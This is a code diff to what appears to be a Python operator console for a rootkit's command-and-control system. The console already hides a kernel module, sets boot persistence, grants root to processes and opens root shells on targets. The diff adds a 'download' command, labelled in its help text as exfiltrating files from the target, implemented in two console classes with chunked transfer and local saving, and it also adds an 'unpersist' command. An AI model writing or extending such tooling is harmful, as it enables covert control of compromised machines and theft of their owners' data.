@@ -27,7 +27,7 @@ KEY_LENGTH = 32
 NONCE_LENGTH = 12
 TAG_LENGTH = 16
 HEADER_LENGTH = 18
-FRAME_MAX = 128
+FRAME_MAX = 4096
 VERSION = 1
 REQUEST = 1
 REPLY = 2
@@ -53,6 +53,7 @@ Operate
   unhide module         restore module to /proc/modules
   persist               request boot persistence
   escalate PID          grant root credentials to PID
+  download PATH [DEST]  exfiltrate file from target
   shell                 open root shell on the target
   shell status          check shell state
 
@@ -84,6 +85,7 @@ class OperatorConsole(cmd.Cmd):
         success: Callable[[str], None],
         on_shell: Callable[[str], None],
         shell_port: int = 0,
+        receive_reply: Callable[[], bytes] | None = None,
     ):
         super().__init__()
         self._exchange = exchange
@@ -93,6 +95,7 @@ class OperatorConsole(cmd.Cmd):
         self._success = success
         self._on_shell = on_shell
         self._shell_port = shell_port
+        self._receive_reply = receive_reply
         self._quit = False
 
     def _send(self, wire: str) -> str:
@@ -207,6 +210,47 @@ class OperatorConsole(cmd.Cmd):
     def do_persist(self, arg: str) -> None:
         self._send("PERSIST")
 
+    def do_unpersist(self, arg: str) -> None:
+        self._send("UNPERSIST")
+
+    def do_download(self, arg: str) -> None:
+        remote_path = arg.strip()
+        if not remote_path:
+            self._warning("usage: download PATH\n")
+            return
+        if not self._receive_reply:
+            self._warning("download is not available in this console\n")
+            return
+        self._output(f"download  {remote_path}\n")
+        reply = self._exchange_quiet(f"DOWNLOAD {remote_path}")
+        if reply.startswith("ERR"):
+            self._warning(f"  {reply}\n")
+            return
+        if not reply.startswith("FILE "):
+            self._warning(f"  unexpected: {reply}\n")
+            return
+        total = int(reply.split()[1])
+        self._output(f"  size: {total} bytes\n")
+        chunks = []
+        received = 0
+        while True:
+            raw = self._receive_reply()
+            if raw == b"EOF":
+                break
+            chunks.append(raw)
+            received += len(raw)
+            pct = received * 100 // total if total else 100
+            self._output(f"\r  {received}/{total} bytes ({pct}%)")
+        self._output("\n")
+        data = b"".join(chunks)
+        dest = Path("downloads") / remote_path.lstrip("/")
+        dest.parent.mkdir(parents=True, exist_ok=True)
+        try:
+            dest.write_bytes(data)
+            self._success(f"  saved {len(data)} bytes to {dest}\n")
+        except OSError as e:
+            self._warning(f"  write failed: {e}\n")
+
     def do_shell(self, arg: str) -> None:
         sub = arg.strip().lower()
         if sub == "status":
@@ -281,6 +325,32 @@ class TargetConsole(OperatorConsole):
             self._warning(f"{self._target.id} went offline\n")
             return True
         return stop
+
+    def do_download(self, arg: str) -> None:
+        remote_path = arg.strip()
+        if not remote_path:
+            self._warning("usage: download PATH\n")
+            return
+        if not self._target:
+            self._warning("no target\n")
+            return
+        self._output(f"download  {remote_path}\n")
+        try:
+            def on_progress(received, total):
+                pct = received * 100 // total if total else 100
+                self._output(f"\r  {received}/{total} bytes ({pct}%)")
+            data, total = self._target.download_file(remote_path, on_progress)
+        except Exception as e:
+            self._warning(f"  {e}\n")
+            return
+        self._output("\n")
+        dest = Path("downloads") / remote_path.lstrip("/")
+        dest.parent.mkdir(parents=True, exist_ok=True)
+        try:
+            dest.write_bytes(data)
+            self._success(f"  saved {len(data)} bytes to {dest}\n")
+        except OSError as e:
+            self._warning(f"  write failed: {e}\n")
 
     def do_back(self, arg: str) -> bool:
         """Return to server view."""
@@ -1095,9 +1165,12 @@ def run_control_console(
             output("\nRemote Bash closed.\n")
             poll_shell_status(request_id, exchange)
 
+        def recv_reply() -> bytes:
+            return secure.open_reply(receive_frame(peer))
+
         console = OperatorConsole(exchange, exchange_quiet, output,
                                   warning, success, handle_shell,
-                                  operator.shell_port)
+                                  operator.shell_port, recv_reply)
         if input_stream is not sys.stdin:
             console.use_rawinput = False
             console.stdin = input_stream
